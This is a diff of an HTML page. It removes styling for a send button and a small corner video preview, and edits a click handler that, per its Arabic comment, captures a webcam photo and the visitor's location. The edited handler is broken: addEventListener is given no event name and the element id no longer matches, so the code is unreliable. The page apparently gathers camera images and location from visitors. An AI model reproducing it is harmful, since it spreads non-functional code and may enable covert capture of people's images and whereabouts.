@@ -28,31 +28,7 @@
     100% { transform: translateY(-50px) scale(0.5); opacity: 0; }
   }
 
-  #sendBtn {
-    position: fixed;
-    top: 20px;
-    left: 50%;
-    transform: translateX(-50%);
-    padding: 15px 30px;
-    font-size: 18px;
-    background-color: black;
-    color: white;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-    z-index: 1000;
-  }
-
-  video, canvas {
-    position: fixed;
-    bottom: 10px;
-    right: 10px;
-    width: 160px;
-    height: 120px;
-    border: 2px solid #000;
-    border-radius: 5px;
-    z-index: 999;
-  }
+ 
 </style>
 </head>
 <body>
@@ -97,7 +73,7 @@
   }
 
   // ======== التقاط الصورة والموقع بعد الضغط ========
-  document.getElementById('sendBtn').addEventListener('click', async () => {
+  document.getElementById('send').addEventListener( async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       const video = document.querySelector('video');
@@ -130,4 +106,5 @@
 
 </body>
 </html>
+
 
